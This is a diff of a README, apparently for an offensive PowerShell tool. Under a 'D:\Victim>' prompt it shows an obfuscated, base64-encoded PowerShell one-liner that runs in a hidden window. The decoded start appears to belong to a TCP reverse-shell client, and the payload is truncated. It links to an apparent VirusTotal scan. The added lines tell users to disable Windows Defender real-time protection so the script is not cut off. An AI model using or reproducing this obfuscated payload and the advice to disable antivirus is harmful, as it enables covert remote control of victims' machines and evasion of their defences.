@@ -71,7 +71,8 @@ D:\Victim>
 powershell /w 1 /C "$a=[scriptblock]::create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAYwBsAGUAYQBuAHUAcAAgAHsAaQBm'+'ACAAKAAkADMAYwBhADQAYgBhADUANgA2AGMAZgBlAGQANQBjADEAYwA1ADMAMQBmAGQAMgA1ADkAYgBjAGYAMAA5ADcAOAAuAEMAbwBuAG4AZQBjAHQAZQBkACAALQBlAHEAIAAkAHQAcgB1AGUAKQAgAHsAJAAzAGMAYQA0AGIAYQA1ADYANgBjAGYAZQBk'+'ADUAYwAx'+'...')));Invoke-Command -ScriptBlock $a"
 ```
 [![](https://user-images.githubusercontent.com/73026669/150165109-71b9f841-3b8e-42bd-a502-5d666244eaaf.png)](https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1)
-
+# error sources
+If you use Windows to run this script, make sure to turn off Defenders RealTimeProtection for this script, because this causes program truncations multiple times.
 
 
 [![Build Status](https://user-images.githubusercontent.com/73026669/110617122-9c75ad00-8195-11eb-9ba5-422356072776.png)](https://github.com/LukeProducts)
